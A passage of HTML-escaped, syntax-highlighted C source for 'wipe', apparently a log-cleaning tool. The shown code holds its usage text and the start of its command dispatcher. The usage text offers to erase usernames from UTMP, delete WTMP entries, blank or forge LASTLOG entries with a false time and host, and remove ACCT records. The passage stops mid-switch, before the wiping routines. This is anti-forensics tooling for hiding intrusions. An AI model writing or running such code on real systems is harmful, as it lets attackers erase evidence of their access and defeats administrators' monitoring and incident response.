&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;UTMP editing:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;    Erase all usernames      :   wipe u [username]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;    Erase one username on tty:   wipe u [username] [tty]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;WTMP editing:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;   Erase last entry for user :   wipe w [username]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;   Erase last entry on tty   :   wipe w [username] [tty]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;LASTLOG editing:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;   Blank lastlog for user    :   wipe l [username]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;   Alter lastlog entry       :   wipe l [username] [tty] [time] [host]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;	Where [time] is in the format [YYMMddhhmm]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef NO_ACCT
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ACCT editing:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;   Erase acct entries on tty :   wipe a [username] [tty]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nf&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;usage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * First character of first argument determines which file to edit.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;toupper&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * UTMP editing.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;cm&#34;&gt;/* UTMP */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_utmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_utmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef HAVE_UTMPX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_utmpx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_utmpx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;cm&#34;&gt;/* WTMP */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;W&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_wtmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_wtmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef HAVE_UTMPX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_wtmpx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_wtmpx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;cm&#34;&gt;/* LASTLOG */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;L&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
